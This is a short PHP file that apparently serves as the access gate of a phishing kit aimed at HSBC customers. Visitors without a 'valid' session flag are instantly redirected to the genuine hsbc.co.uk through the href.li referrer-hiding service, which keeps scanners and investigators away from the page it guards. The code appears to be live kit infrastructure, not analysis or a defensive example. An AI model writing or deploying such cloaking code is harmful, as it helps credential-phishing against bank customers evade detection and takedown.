<?php
session_start();
if(!isset($_SESSION["valid"]))
{
echo '<html><head><meta http-equiv="refresh" content="0;URL=https://href.li/?https://www.hsbc.co.uk" /></head><body></body></html>';
die();
}



?>
